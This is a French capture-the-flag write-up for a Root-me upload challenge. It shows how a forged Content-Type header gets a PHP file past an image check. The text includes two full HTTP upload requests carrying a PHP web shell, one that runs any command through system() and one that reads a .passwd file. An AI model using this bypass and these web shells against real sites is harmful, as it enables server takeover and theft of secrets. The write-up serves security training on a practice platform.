---
title: Root-me - Web Serveur - File Upload - MIME Type
meta_title: ""
description: Obtenez l'accès à un fichier au travers d'un file upload.
date: 2024-06-07T05:00:00Z
image: /images/rootme_logo.png
categories:
  - Web
  - Facile
author: Emma.exe
tags:
  - Forensic
  - Rootme
draft: false
---
## Introduction

Ce challenge consiste à récupérer le contenu du fichier .passwd à la racine du site web via un File Upload.

Pour la résolution de ce challenge je vous propose deux niveaux d'aide : 
- Le premier niveau sous la forme d'indices et de ressources à explorer pour résoudre le challenge, sans pour autant donner la solution
- Le deuxième niveau qui présente un exemple de résolution.

{{< notice "tip" >}} Essayez de ne pas regarder la solution si vous voulez vraiment progresser. Une fois le challenge résolu, il peut être intéressant de la regarder pour apprendre de nouvelles techniques ! {{< /notice >}}

## Résolution

{{< tabs >}} {{< tab "Niveau 1" >}}

Afin de résoudre ce challenge, il va falloir analyser les requêtes HTTP.
Pour cela, je vous conseille d'utiliser **Burp** et plus particulièrement l'onglet **Repeter**. Cela vous permettra de modifier les requêtes avant de les envoyer.

Commencez par l'upload d'un fichier afin de regarder à quoi ressemble la requête.
Tentez ensuite de modifier cette dernière afin d'obtenir ce que vous voulez (ici il s'agit du fichier passwd).

Autre tips : il existe des snippets de code dans toutes les machines Kali, notamment des webshells.
Ils se trouvent dans le dossier `/usr/share/webshells`.
Tel quel, cela ne fonctionnera peut-être pas, mais cela fait une bonne base départ...

{{< /tab >}}

{{< tab "Niveau 2" >}}
La vulnérabilité utilisée ici se situe dans les Headers de la requête HTTP.
Pour vérifier que le type de fichier uploadé est bien de type image, le site regarde le Header "Content-Type".
Sauf que cela ne nous empêche absolument d'uploader un fichier qui n'a rien à voir.

Dans cet exemple j'ai pris comme base de départ le fichier `simple-backdoor.php` présent sur toutes les machines Kali dans `/usr/share/webshells/php`. 

Première tentative en modifiant le content-type : 
```
POST /web-serveur/ch21/?action=upload HTTP/1.1
Host: challenge01.root-me.org
Content-Length: 432
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge01.root-me.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9DdNYGfZ5mzYhp5Y
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge01.root-me.org/web-serveur/ch21/?action=upload
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=e8e48070edc02be1a3358b72fcf530eb; session=.eJwlzkEOwkAIAMC_7NnDLgUW-hkDLESvrT0Z_66J84J5t3sdeT7a_jquvLX7c7W9Dd6WGPXhlDNmBGcfCB1mcphLkKl07JbAKb5YITbHrDHYJyeWgwS7dVWSYai0RhnoNlMYOMK4oGwGEqjQwgosXUHck6a0X-Q68_hvsH2-ybsvgg.Zozx_A.TiJSUDTEkquRAH1FCDxQ7Tri1XY
Connection: close

------WebKitFormBoundary9DdNYGfZ5mzYhp5Y
Content-Disposition: form-data; name="file"; filename="simple-backdoor2.php"
Content-Type: image/png


<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: testetsttset3=5

<!--    http://michaeldaw.org   2006    -->

------WebKitFormBoundary9DdNYGfZ5mzYhp5Y--
```

Le php est bien exécuté par le site, cependant ce dernier n'accepte pas qu'on mette des paramètres dans l'URL (or, c'est comme cela que fonctionne ce webshell).
Il va donc falloir directement exécuter la commande qui nous intéresse :

```headers
POST /web-serveur/ch21/?action=upload HTTP/1.1
Host: challenge01.root-me.org
Content-Length: 432
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge01.root-me.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9DdNYGfZ5mzYhp5Y
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge01.root-me.org/web-serveur/ch21/?action=upload
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=e8e48070edc02be1a3358b72fcf530eb; session=.eJwlzkEOwkAIAMC_7NnDLgUW-hkDLESvrT0Z_66J84J5t3sdeT7a_jquvLX7c7W9Dd6WGPXhlDNmBGcfCB1mcphLkKl07JbAKb5YITbHrDHYJyeWgwS7dVWSYai0RhnoNlMYOMK4oGwGEqjQwgosXUHck6a0X-Q68_hvsH2-ybsvgg.Zozx_A.TiJSUDTEkquRAH1FCDxQ7Tri1XY
Connection: close

------WebKitFormBoundary9DdNYGfZ5mzYhp5Y
Content-Disposition: form-data; name="file"; filename="simple-backdoor2.php"
Content-Type: image/png


<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

        echo "<pre>";
        system("cat ../../../.passwd");
        echo "</pre>";
        die;


?>

Usage: testetsttset3=5

<!--    http://michaeldaw.org   2006    -->

------WebKitFormBoundary9DdNYGfZ5mzYhp5Y--
```

Et on obtient le flag !

{{< /tab >}}{{< /tabs >}}
